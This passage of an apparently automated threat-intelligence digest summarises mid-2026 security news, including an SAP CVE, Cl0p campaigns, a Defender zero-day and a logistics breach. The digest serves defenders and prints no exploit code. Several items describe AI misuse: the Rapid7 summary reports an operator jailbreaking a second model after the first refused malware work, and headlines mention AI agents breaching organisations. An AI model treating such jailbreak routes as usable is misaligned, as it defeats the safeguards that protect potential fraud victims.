understates the danger, because not every leaked string is a live risk. What matters is which secrets are validated —confirmed active and usable at the time of discovery. In our State of SDLC 2026 report, we found validated secrets found in public repositories frequently provide infrastructure-level access rather than application-only access: cloud provider credentials, CI/CD tokens, third-party API keys, and AI service credentials. In other words, a leaked key of this kind isn't a door into one app, it's a door into the infrastructure behind it. Two forces are accelerating this risk. AI-assisted development : AI increases code volume, reuse, and automated change propagation, which lets existing secrets spread faster and farther across development environments than teams can review them. Novel risk from newer AI platforms: These platforms are young, but their credentials already leak at a rate disproportionate to the ecosystem's age— four of the top five most frequently leaked validated secrets are for AI services, because coding assistants optimize for velocity and velocity is where security review gets skipped. Why Scanning Alone Doesn't Close the Gap While traditional approaches to Secret Scanning are a good baseline form of defense, it doesn’t address the two things that make personal-repo exposure dangerous. Secret scanning doesn’t see outside enterprise boundaries : As we’ve discussed, personal repositories are an invisible risk for organizations. A developer's personal public repo isn't org-owned, so it never enters inventory. You can't scan an asset you don't know exists. Detected secrets don’t always map to exploitable attack paths : A detector produces a string match, not a risk. Is the secret still valid? Does it grant access to anything real? Knowing a secret is present is not the same as knowing it is live, and knowing it is live is not the same as knowing what it can reach. The challenge isn't finding more secrets. Personal repository scanning often uncovers plenty. The challenge is knowing which ones actually matter. Without context, thousands of exposed secrets become just another backlog. By connecting exposed secrets back to your organization and enriching them with cloud, identity, and runtime context, security teams can prioritize
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Closing the Blind Spot: Securing Personal Repositories in the Software Supply Chain
  - Published: 2026-08-13T13:48:56+00:00
  - Link: https://www.wiz.io/blog/securing-personal-repositories
  - Summary: Personal repositories are where corporate secrets quietly escape. Wiz correlates them to your developers, validates the real risk, and drives the fix.

### Cluster a50e916d10 — score 12

- Title: SAP Commerce Cloud CVE-2026-58231 Targeted in Exploitation Attempts Days After Patch
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-15T08:38:46+00:00
- Link: https://thehackernews.com/2026/08/sap-commerce-cloud-cve-2026-58231.html
- Fetch status: ok
- Member count: 3
- Corroborating source count: 2
- Strong signals: CVE-2026-58231

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, credential_theft, web_shell_backdoor
- actor_attribution: UNC5174, UNC5221
- affected_industries: telecommunications
- affected_products: Anthropic/Claude, Apple iOS/macOS, Azure
- cve_ids: CVE-2025-31324, CVE-2026-58231
- urgency_signals: poc_available, preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: credential_theft, apt_espionage, web_shell_backdoor
- actor_attribution: UNC5221, UNC5174
- affected_industries: telecommunications
- affected_products: Apple iOS/macOS, Anthropic/Claude, Azure
- cve_ids: CVE-2026-58231, CVE-2025-31324
- urgency_signals: preauth_unauth, poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
A maximum-severity security vulnerability impacting SAP Commerce Cloud is witnessing active exploitation efforts. The vulnerability, tracked as CVE-2026-58231, is rated 10.0 on the CVSS scoring system. It relates to an instance of insufficient authorization checks and input validation. "SAP Commerce Cloud allows an unauthenticated attacker to abuse a default authentication client and submit
```

#### Full body

```
SAP Commerce Cloud CVE-2026-58231 Targeted in Exploitation Attempts Days After Patch  Ravie Lakshmanan  Aug 15, 2026 Vulnerability / Cloud Security A maximum-severity security vulnerability impacting SAP Commerce Cloud is witnessing active exploitation efforts. The vulnerability, tracked as CVE-2026-58231 , is rated 10.0 on the CVSS scoring system. It relates to an instance of insufficient authorization checks and input validation. "SAP Commerce Cloud allows an unauthenticated attacker to abuse a default authentication client and submit specially crafted input to certain functions lacking sufficient validation," per CVE.org. "Successful exploitation could enable arbitrary code execution and compromise internal components, resulting in high impact on confidentiality, integrity, and availability of the application." According to Defused Cyber, exploitation attempts against CVE-2026-58231 began to hit its honeypot systems merely three days after the release of the patch. "This vulnerability has no public PoC and is not known to be exploited," the threat intelligence company said in an X post shared on Friday. SAP security company Onapsis noted earlier this week that successful exploitation of CVE-2026-58231 could permit arbitrary code execution and compromise internal components. "Customers must patch to the fixed Commerce Cloud release levels referenced in the note and re-build/re-deploy the updated SAP Commerce Cloud version," it said. "As a temporary workaround, customers can reduce their exposure by configuring an IP Filter Set in SAP Commerce Cloud to restrict access to the vulnerable endpoint." There are currently no details available on who is behind the exploitation efforts targeting the flaw. However, prior flaws (CVE-2025-31324) impacting SAP products, including NetWeaver, have been weaponized by China-nexus espionage clusters like UNC5221, UNC5174, and CL-STA-0048, as well as cybercrime groups such as BianLian and RansomExx . In April 2025, unknown threat actors were also observed exploiting the same critical SAP NetWeaver vulnerability to deploy a backdoor called Auto-Color in an attack aimed at a U.S.-based chemicals company. Update KEVIntel has also independently confirmed seeing exploitation efforts against CVE-2026-58231, with two attempts detected on August 14 from a lone IP address located in the U.S. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Application Security , Cloud security , Cyber Attack , enterprise security , exploit , Patch Management , remote code execution , SAP , Threat Intelligence , Vulnerability ⚡ Top Stories This Week Azure Cosmos DB Flaw Exposed Platform-Wide Key That Could Access Any Database Anthropic Says Claude Mistook the Open Internet for a CTF and Breached Three Organizations Researchers Report 84 Flaws in 4G and 5G Cores, Including a Session Hijacking Flaw Cheap Android TV Boxes Pose as Phones and Turn Owners’ Broadband Into Proxies N-able Says Attackers Take Over N-central Servers After Initial Fix Proves Incomplete Google Password Manager Attacks Could Let Malware Hijack Passkey-Protected Accounts New cPanel Critical Flaw Could Let Hosting Customers Run SQL as Database Root Keyv-Linked npm Worm Poisons Hundreds of Packages, Plants Claude Code and VS Code Hooks Claude Mythos 5 Tried to Backdoor a Real Open-Source Project in Testing, Then Vouched for Itself Critical Gitea Flaw Let Unauthenticated Attackers Read Server Files via Org-Mode Markup Poison Claude Sells Discounted Claude Access While Its Operator Sees Every Customer Prompt Over 250 ClickFix Domains Use Browser Fingerprinting to Hide macOS Malware Lures Chinese-Made Zbtlink Routers Ship With Backdoor That Opens Unauthenticated Root Shells Apple iCloud Private Relay Can Expose Real IPs Through WebKit Proxy Bypasses ThreatsDay: Odysseus RCE, Samsung One-Click Takeover, iCloud Backdoor Fight + 27 Mo
```

#### Corroborating sources (2)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: SAP Commerce Cloud CVE-2026-58231 Targeted in Exploitation Attempts Days After Patch
  - Published: 2026-08-15T08:38:46+00:00
  - Link: https://thehackernews.com/2026/08/sap-commerce-cloud-cve-2026-58231.html
  - Summary: A maximum-severity security vulnerability impacting SAP Commerce Cloud is witnessing active exploitation efforts. The vulnerability, tracked as CVE-2026-58231, is rated 10.0 on the CVSS scoring system. It relates to an instance of insufficient authorization checks and input validation. "SAP Commerce Cloud allows an unauthenticated attacker to abuse a default authentication client and submit
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Critical SAP Commerce Cloud Vulnerability Exploited 3 Days After Disclosure
  - Published: 2026-08-17T08:13:07+00:00
  - Link: https://www.securityweek.com/critical-sap-commerce-cloud-vulnerability-exploited-3-days-after-disclosure/
  - Summary: The vulnerability tracked as CVE-2026-58231 can be exploited to execute arbitrary code and compromise internal components. The post Critical SAP Commerce Cloud Vulnerability Exploited 3 Days After Disclosure appeared first on SecurityWeek .

### Cluster fb556ca51b — score 12

- Title: Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-08-12T15:55:32+00:00
- Link: https://www.team-cymru.com/post/cl0p-ransomware-mft-attack-pattern-threat-intelligence
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: Cl0p

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion, zero_day
- actor_attribution: Cl0p
- affected_products: SolarWinds
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day
- actor_attribution: Cl0p
- affected_products: SolarWinds
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Analyze Cl0p ransomware's history of targeting MFT systems. Discover their attack pattern in threat intelligence to improve cyber attack surface reduction.
```

#### Full body

```
All Blog Internet Weather Threat Research Threat Intelligence 101 Eli Woodward 5 min read August 12, 2026 Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days PART I Operational Profile and Campaign Analysis 1. The MFT Targeting Pattern Cl0p’s defining operational characteristic is a sustained and systematic focus on managed file transfer infrastructure. Across nine known campaigns, the group has targeted Accellion FTA, SolarWinds Serv-U, Fortra GoAnywhere MFT, PaperCut MF/NG, Progress MOVEit Transfer, SysAid ITSM, Cleo MFT (Harmony, VLTrader, LexiCom), Oracle E-Business Suite, and Gladinet Centrestack/TrioFox. With the partial exception of PaperCut (a print management server) and SysAid (an IT service management platform), every target shares a common architectural profile: an internet-facing application that processes, stores, or transfers files. This targeting consistency is significant for two reasons. First, it indicates strategic specialization rather than opportunistic exploitation. The group has invested in developing or acquiring zero-day capabilities specifically for this product category, deploying novel exploits in seven of nine campaigns. Second, it defines a bounded, defensible attack surface. Organizations that operate MFT infrastructure can identify themselves as potential targets and implement category-specific protections — a defensive advantage that is uncommon against most ransomware groups. Figure 1: Complete Cl0p campaign history, 2020–2025 ‍ 2. Exploitation Timeline The chronological record of Cl0p campaigns reveals a distinctive operational tempo characterized by extended dormancy periods punctuated by concentrated bursts of activity. Figure 2: Campaign timeline with inter-campaign intervals ‍ Several patterns merit attention. The group’s longest dormancy period — approximately 14 months between the SolarWinds Serv-U exploitation in late 2021 and the Fortra GoAnywhere campaign in January 2023 — was followed by its most active phase: four distinct campaigns across four separate technologies in ten months (January through October 2023). This burst-and-pause cadence suggests a development cycle in which the group acquires or develops exploits, executes campaigns in rapid succession, and then withdraws to prepare for the next cycle. The inter-campaign intervals since 2023 have been notably consistent, ranging from 10 to 14 months between major operations. This periodicity, while not perfectly predictable, provides a rough forecasting baseline. As of mid-2026, the group’s last confirmed campaign (Centrestack, November 2025) was approximately eight months ago — suggesting the next operational cycle may be approaching. 3. Seasonal Clustering: The Q4 Pattern Figure 3: Cl0p campaigns by quarter — Q4 exceeds all other quarters combined When campaigns are mapped by calendar quarter, Q4 emerges as the dominant operational window. Five of nine confirmed campaigns were initiated during October through December — more than all other quarters combined. This clustering is operationally rational: Q4 coincides with major holidays in the United States and Europe (Thanksgiving, Christmas, New Year), periods when security operations centers are typically operating at reduced capacity and organizational response times are extended. The Centrestack campaign provides the most explicit example. Initial compromises occurred on Thanksgiving Day 2025 (November 27), a date that maximized the gap between initial access and organizational detection. This seasonal preference should be treated as a high-confidence behavioral indicator for defensive planning purposes. 4. Pre-Attack Reconnaissance One of the most strategically significant findings in this analysis is the extent to which Cl0p conducts advance reconnaissance against eventual targets. This behavior has been confirmed in at least two campaigns and is assessed as likely present but undetected in others. 4.1 MOVEit: Two Years of Pre-Attack Scanning Following the MOVEit exploi
```

#### Corroborating sources (2)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days
  - Published: 2026-08-12T15:55:32+00:00
  - Link: https://www.team-cymru.com/post/cl0p-ransomware-mft-attack-pattern-threat-intelligence
  - Summary: Analyze Cl0p ransomware's history of targeting MFT systems. Discover their attack pattern in threat intelligence to improve cyber attack surface reduction.
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Philips and GE investigating Clop ransomware data theft claims
  - Published: 2026-08-17T11:25:02+00:00
  - Link: https://www.bleepingcomputer.com/news/security/philips-and-ge-investigating-clop-ransomware-data-theft-claims/
  - Summary: Tech giants General Electric (GE) and Philips have also confirmed they're investigating claims that the Clop ransomware gang breached their systems and stole data. [...]

### Cluster 7e142768f0 — score 11

- Title: 17th August – Threat Intelligence Report
- Source: Check Point Research (threat_research_primary)
- Published: 2026-08-17T13:37:34+00:00
- Link: https://research.checkpoint.com/2026/17th-august-threat-intelligence-report/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach, phishing_social_eng, ransomware_extortion
- actor_attribution: Kimsuky
- affected_industries: critical_infrastructure, financial_services, government, healthcare
- affected_products: Apple iOS/macOS, Microsoft 365, Microsoft SharePoint
- cve_ids: CVE-2026-53413, CVE-2026-65400, CVE-2026-68820, CVE-2026-71362
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, data_breach, active_exploitation
- actor_attribution: Kimsuky
- affected_industries: healthcare, financial_services, government, critical_infrastructure
- affected_products: Microsoft 365, Apple iOS/macOS, Microsoft SharePoint
- cve_ids: CVE-2026-68820, CVE-2026-65400, CVE-2026-71362, CVE-2026-53413
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
For the latest discoveries in cyber research for the week of 17th August, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Colombia’s Ministry of Justice has experienced a ransomware attack that affected part of its technology infrastructure and disrupted public services related to illicit-drug monitoring and legal processes. Officials confirmed that some files were […] The post 17th August – Threat Intelligence Report appeared first on Check Point Research .
```

#### Full body

```
FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 17th August – Threat Intelligence Report August 17, 2026 https://research.checkpoint.com/2026/17th-august-threat-intelligence-report/ For the latest discoveries in cyber research for the week of 17th August, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Colombia’s Ministry of Justice has experienced a ransomware attack that affected part of its technology infrastructure and disrupted public services related to illicit-drug monitoring and legal processes. Officials confirmed that some files were encrypted but stated that no data theft was detected during the incident. MyDr, Poland’s primary healthcare platform for appointments, medical records, and prescriptions, has suffered a data breach potentially affecting nearly 19 million citizens. Attackers claimed to hold 2.5TB of information and shared a senior politician’s identification details, phone numbers, and prescriptions as evidence of the compromise. Levi Strauss & Co., the global American apparel company, has reported a cyberattack after attackers used social engineering to compromise three employee devices and steal corporate information. According to the firm, preliminary findings indicate no consumer data was accessed or copied. The company notified affected individuals and relevant regulators. IEH Corporation, a US defense and aerospace component manufacturer, has confirmed a phishing compromise of an employee’s Microsoft 365 mailbox. Attackers used a fraudulent document-sharing link to steal credentials, potentially exposing customer communications, purchase orders, engineering documents, and export-controlled technical information. AI THREATS Researchers detailed a suspected China-linked campaign that used autonomous AI agents against Taiwanese government systems. The operation reportedly mapped 21 systems, compromised 85 accounts, and obtained 2,500 personnel records before expanding toward a nuclear safety organization and seven companies in the energy sector. Researchers outlined how North Korea-linked Kimsuky is building an offline AI environment to support phishing, intelligence analysis, and malware development. The setup combines locally hosted language models with document retrieval, code resources, and transcription capabilities, potentially allowing operators to automate additional stages of cyberespionage activity. Researchers found that encrypted reasoning blocks used by OpenAI, Anthropic, and Google APIs could be replayed across sessions. Analysis of more than 315,000 blocks recovered hundreds of sensitive artifacts from published agent logs, including API keys, passwords, authentication tokens, and private cryptographic keys. VULNERABILITIES AND PATCHES Microsoft has released its August Patch Tuesday security updates, addressing 421 vulnerabilities across Windows, Office, SharePoint, Exchange Server, Azure and other products. The fixes include 42 critical flaws and CVE-2026-68820, an actively exploited Windows Ancillary Function Driver for WinSock vulnerability that allows local attackers to gain SYSTEM privileges. Apple released patches for CVE-2026-65400, a critical macOS Screen Sharing authentication vulnerability with a CVSS score of 9.8. The flaw allows network attackers to authenticate without valid credentials. Active exploitation against internet-exposed systems has resulted in root access and deployment of Monero cryptocurrency miners. Adobe released a fix for CVE-2026-71362, a critical authentication vulnerability affecting Adobe Commerce and Magento Open Source. Attackers began exploiting the flaw shortly after public disclosure. Successful exploitation enables unauthorized session switching, potentially allowing account takeover and access to information associated with affected accounts. Zoom addressed three critical vulnerabilities in Zoom Workplace, including CVE-2026-53413, that could enable remote code execution during a meeting. The flaws
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: 17th August – Threat Intelligence Report
  - Published: 2026-08-17T13:37:34+00:00
  - Link: https://research.checkpoint.com/2026/17th-august-threat-intelligence-report/
  - Summary: For the latest discoveries in cyber research for the week of 17th August, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Colombia’s Ministry of Justice has experienced a ransomware attack that affected part of its technology infrastructure and disrupted public services related to illicit-drug monitoring and legal processes. Officials confirmed that some files were […] The post 17th August – Threat Intelligence Report appeared first on Check Point Research .

### Cluster 6cf2dd574b — score 11

- Title: Operation ASTERIX: Anatomy of a Crypto Fraud Pipeline
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-08-17T11:29:31+00:00
- Link: https://www.rapid7.com/blog/post/tr-operation-asterix-crypto-fraud-vishing-phishing
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Operation ASTERIX overview Rapid7 researchers identified an exposed web directory on infrastructure used to support a cryptocurrency fraud operation. The server contained raw phone-number datasets, account-validation tools, enriched lead records, phishing panels, voice-dialing scripts, fake wallet applications, persistence mechanisms, and Telegram exfiltration code. Among the artifacts was evidence that the operator relied on AI coding assistants throughout the campaign's development; recovered prompts, shell history, and project files show AI being used to package Electron applications, obfuscate code, troubleshoot builds, modify phishing infrastructure, and prepare malware for distribution. When one model began resisting parts of that workflow, the operator switched providers and attempted to bypass the next model's safety controls with a custom jailbreak prompt. Together, these artifacts provide an unusual view into how AI was integrated into the development of an active phishing op
```

#### Full body

```
Back to Blog Threat Research Operation ASTERIX: Anatomy of a Crypto Fraud Pipeline Anna Širokova | Jan Recinsky Aug 17, 2026 | Last updated on Aug 17, 2026 | 22 min read DISCOVER RAPID7 MDR Operation ASTERIX overview Rapid7 researchers identified an exposed web directory on infrastructure used to support a cryptocurrency fraud operation. The server contained raw phone-number datasets, account-validation tools, enriched lead records, phishing panels, voice-dialing scripts, fake wallet applications, persistence mechanisms, and Telegram exfiltration code. Among the artifacts was evidence that the operator relied on AI coding assistants throughout the campaign's development; recovered prompts, shell history, and project files show AI being used to package Electron applications, obfuscate code, troubleshoot builds, modify phishing infrastructure, and prepare malware for distribution. When one model began resisting parts of that workflow, the operator switched providers and attempted to bypass the next model's safety controls with a custom jailbreak prompt. Together, these artifacts provide an unusual view into how AI was integrated into the development of an active phishing operation rather than simply being used to generate isolated snippets of code. We track this activity as Operation ASTERIX, named after the Asterisk open-source telephony platform recovered on the server. The operator used Asterisk to automate the campaign's vishing infrastructure, coordinating phone calls with phishing emails and counterfeit wallet applications. The recovered material shows how the operator combined several techniques: Bulk account enumeration against cryptocurrency platforms Phishing emails that created fake support cases Vishing calls that referenced details from those emails Counterfeit Ledger, Trezor, and Exodus applications Seed-phrase theft and Telegram exfiltration AI-assisted development, including an attempt to bypass an LLM’s safety controls Much of the value around this finding is timing. Much of the infrastructure was still in use or under development when it was exposed. This allowed Rapid7 Labs to notify the appropriate providers and authorities while the operation was still active, while also documenting the campaign's tooling and development process. Rapid7 Labs disclosed the identified infrastructure and findings to the relevant authorities, including Apple's security team, and collaborated with them to support action against the activity described in this report. Technical analysis and observed attacker behavior The recovered files show a multi-stage operation designed to focus social engineering on confirmed cryptocurrency users. The attacker used account-checking tools to confirm which phone numbers were tied to active crypto exchange accounts, narrowing a raw dataset down to confirmed holders. From there, the recovered infrastructure supported multiple outreach channels. The phishing panels generated fake support cases and verification codes that were later referenced during phone calls, while files such as extract_sg_numbers.py and sg_leads_server.py suggest additional lead-management and direct-outreach capabilities. Although call logs were not recovered to reconstruct every interaction, the recovered artifacts indicate that these channels ultimately directed victims toward counterfeit wallet applications designed to steal recovery phrases. Figure 1: Operation ASTERIX kill chain from acquisition to exfiltration ⠀ Each stage narrowed the target pool or increased trust before the operator asked the user to install software or provide wallet recovery information. That structure is important for defenders, as it creates several points where the campaign can be detected or interrupted before seed phrases are stolen. Account validation The server had approximately 885,000 phone numbers organized into multiple files by region and source. The largest file included 316,002 German mobile numbers, with additional lists covering Hong
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Operation ASTERIX: Anatomy of a Crypto Fraud Pipeline
  - Published: 2026-08-17T11:29:31+00:00
  - Link: https://www.rapid7.com/blog/post/tr-operation-asterix-crypto-fraud-vishing-phishing
  - Summary: Operation ASTERIX overview Rapid7 researchers identified an exposed web directory on infrastructure used to support a cryptocurrency fraud operation. The server contained raw phone-number datasets, account-validation tools, enriched lead records, phishing panels, voice-dialing scripts, fake wallet applications, persistence mechanisms, and Telegram exfiltration code. Among the artifacts was evidence that the operator relied on AI coding assistants throughout the campaign's development; recovered prompts, shell history, and project files show AI being used to package Electron applications, obfuscate code, troubleshoot builds, modify phishing infrastructure, and prepare malware for distribution. When one model began resisting parts of that workflow, the operator switched providers and attempted to bypass the next model's safety controls with a custom jailbreak prompt. Together, these artifacts provide an unusual view into how AI was integrated into the development of an active phishing op

### Cluster dcf9212f8f — score 11

- Title: Microsoft working on Defender patch for ShieldBreak zero-day
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-08-17T09:05:33+00:00
- Link: https://www.bleepingcomputer.com/news/security/microsoft-working-on-defender-patch-for-shieldbreak-zero-day/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-69414

#### Cluster taxonomy (union across members)
- threat_categories: vulnerability_disclosure, zero_day
- affected_industries: legal_professional
- affected_products: Microsoft BitLocker, Microsoft Defender, Microsoft Windows
- cve_ids: CVE-2026-50656, CVE-2026-69414
- urgency_signals: poc_available, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, vulnerability_disclosure
- affected_industries: legal_professional
- affected_products: Microsoft Windows, Microsoft Defender, Microsoft BitLocker
- cve_ids: CVE-2026-69414, CVE-2026-50656
- urgency_signals: zero_day, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Microsoft is working on a security patch for the "ShieldBreak" zero-day vulnerability disclosed last week by security researcher "Nightmare Eclipse" and now tracked as CVE-2026-69414. [...]
```

#### Full body

```
Microsoft working on Defender patch for ShieldBreak zero-day By Sergiu Gatlan August 17, 2026 05:05 AM 1 On Friday, Microsoft confirmed it has begun working on a security patch for a Defender zero-day vulnerability named "ShieldBreak." A security researcher who uses the "Nightmare Eclipse" handle disclosed this privilege escalation vulnerability after Microsoft released the August 2026 Patch Tuesday security updates. ​"Microsoft is aware of the reported vulnerability and is actively investigating the validity and potential applicability of these claims," a Microsoft spokesperson told BleepingComputer when asked for a statement regarding the new ShieldBreak zero-day. "Microsoft is committed to investigating security issues and updating impacted products to protect customers as soon as possible." Nightmare Eclipse described ShieldBreak as a bypass for RoguePlanet , another Defender privilege escalation flaw disclosed in June, and shared a ShieldBreak proof-of-concept (PoC) exploit that local attackers with limited permissions can use to gain SYSTEM privileges on fully patched Windows 10, Windows 11, and Windows Server systems. "Microsoft has failed to properly patch the RoguePlanet vulnerability CVE-2026-50656, this PoC demonstrates a full patch bypass," Nightmare Eclipse said . "The PoC was tested in the latest version of windows 11 25h2 (+Canary channel) and windows server 2025, the PoC also have a 100% success rate. Please note that Windows 10 (and respective server editions) are not currently supported, they are however vulnerable to ShieldBreak as well." Vulnerability analyst Will Dormann confirmed last week that the ShieldBreak exploit works but added that Microsoft Defender must also be enabled for attackers to escalate privileges. ShieldBreak PoC exploit demo (Nightmare Eclipse) Tracked as CVE-2026-69414 and waiting for a patch On Friday, three days after ShieldBreak was disclosed, Microsoft said it's now tracking the flaw as CVE-2026-69414 and confirmed it's working on a patch, but has yet to acknowledge that Nightmare Eclipse found it. "Microsoft is aware of an elevation of privilege in the Microsoft Malware Protection Engine in Microsoft Defender publicly referred to as 'ShieldBreak,'" the company said. "We are working to provide a high quality security update that addresses this vulnerability. We will provide information in this CVE when the update is available." Nightmare Eclipse publicly disclosed ShieldBreak without notice to Microsoft as part of an ongoing dispute with the company over its vulnerability disclosure and bug bounty practices. Days after the researcher published PoC exploits without prior notice, Microsoft responded with warnings of legal action against people engaging in "malicious activity causing real harm" to its customers, prompting many to believe that the company was directly threatening the security researcher. Since April, Nightmare Eclipse has disclosed multiple zero-day exploits targeting Microsoft Defender, BitLocker, and various other Windows components, now known as LegacyHive , RoguePlanet , BlueHammer , RedSun , YellowKey , GreenPlasma , MiniPlasma , and UnDefend . While the company fixed the YellowKey, GreenPlasma, and MiniPlasma flaws as part of the June 2026 Patch Tuesday and RoguePlanet in July , the other security flaws disclosed by Nightmare Eclipse remain zero-days and are still awaiting an official patch. Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: New Microsoft Defender 'ShieldBreak' zero-day grants SYSTEM privileges Microsoft patches LegacyHive Windows zero-day vulnerability New Windows LegacyHive zero-day gives hackers admin privileges Wind
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Microsoft working on Defender patch for ShieldBreak zero-day
  - Published: 2026-08-17T09:05:33+00:00
  - Link: https://www.bleepingcomputer.com/news/security/microsoft-working-on-defender-patch-for-shieldbreak-zero-day/
  - Summary: Microsoft is working on a security patch for the "ShieldBreak" zero-day vulnerability disclosed last week by security researcher "Nightmare Eclipse" and now tracked as CVE-2026-69414. [...]

### Cluster b6abff1635 — score 11

- Title: Logistics Giant Ceva Suffers Data Breach Impacting European Clients
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-08-11T10:45:00+00:00
- Link: https://www.infosecurity-magazine.com/news/logistics-ceva-data-breach/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, phishing_social_eng, ransomware_extortion, supply_chain
- affected_industries: financial_services, manufacturing_industrial, retail_ecommerce
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, data_breach
- affected_industries: financial_services, manufacturing_industrial, retail_ecommerce
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Supply chain attack and data breach at Ceva Logistics appears to have a large blast radius
```

#### Full body

```
Infosecurity Magazine Home » News » Logistics Giant Ceva Suffers Data Breach Impacting European Clients Logistics Giant Ceva Suffers Data Breach Impacting European Clients News 11 August 2026 Written by Phil Muncaster UK / EMEA News Reporter , Infosecurity Magazine Email Phil Follow @philmuncaster A data breach at one of the world’s biggest logistics companies appears to have had a significant impact on its wider supply chain ecosystem of customers. Ceva Logistics is a subsidiary of the French CMA CGM Group, which is the world’s third-largest shipper. A brief statement from the firm seen by Infosecurity claimed its European contract logistics operations were impacted by the breach. This part of the business provides customers with warehousing and fulfilment, manufacturing support and aftermarket services. The statement said Ceva notified impacted customers on August 1, with eight warehouses affected. “No other Ceva systems globally were affected, and all other operations continue without incident,” it added Read more on logistics breaches: UK Logistics Firm Forced to Close After Ransomware Breach An email sent by Ceva client, video game developer Valve , to its customers and republished online claimed the cyber-attack lasted from July 29 to August 1. “Ceva receives specific delivery-related information from Steam to be able to ship physical hardware to customers in Europe, and told us these are the details the attacker likely took,” it explained. “Because Ceva retains this information for up to 90 days after that order, we are sending this message to all customers we can assume were impacted.” In this case, hackers may have obtained names, email and home addresses, phone numbers and order details. Aside from the gaming specialist, other Ceva clients impacted by the incident include Dutch online retail firm Bol, which said restoration of operations at Ceva’s Veerweg location is taking longer than anticipated, and may impact service levels. Dutch department store chain De Bijenkorf was also impacted, as was football club Ajax and banking giant ING. Logistics Under Fire The logistics sector is an obvious choice for cybercriminals, argued Joseph Perry, cybersecurity researcher and advanced services lead at Arcova. “They sit at the center of thousands of transactions between businesses and their customers. That makes them an appealing target because a compromise can create operational problems while also giving attackers access to information about the people and products moving through the system,” he argued. “Shipping information is also highly contextual. A name, address, phone number, email address, and recent purchase can give attackers enough context to make phishing and impersonation attempts far more convincing.” These companies should be treated as “part of the security and operational environment” of all those that depend on them, said Perry. “You do not have to be the final target to become the point of failure,” he added. KnowBe4 CISO advisory, Anna Collard, described the incident as a “textbook supply chain breach.” “I’d expect a wave of ‘delivery problem’ lures over the coming weeks, messages about a redelivery fee or a request to ‘verify’ an order,” she added. “So treat any unexpected message about this order as fake, don’t click links or pay fees, and go directly to the retailer’s official site by typing the address yourself.” In 2020, CMA CGM suffered a ransomware attack on its servers, leading to the temporary closure of its shipping website and applications. You may also like Hellmann Warns Customers They Could Face Malicious Communications Following Attack News 24 December 2021 Widespread Net RFQ Scam Targets High-Value Goods News 22 July 2025 Researchers Warn of Global Surge in Fake Shipment Tracking Scams News 16 March 2026 "Workarounds" Helped Royal Mail Resume Shipping After Ransomware Attack News 20 January 2023 Interview: Mitigating Cyber-Threats in the Maritime Industry Interview 23 May 2022 What’s Hot on
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Logistics Giant Ceva Suffers Data Breach Impacting European Clients
  - Published: 2026-08-11T10:45:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/logistics-ceva-data-breach/
  - Summary: Supply chain attack and data breach at Ceva Logistics appears to have a large blast radius

### Cluster c41212d2e8 — score 11

- Title: Risky Bulletin: The EU publishes its upcoming cybersecurity standards
- Source: Risky Business News (practitioner_analysis)
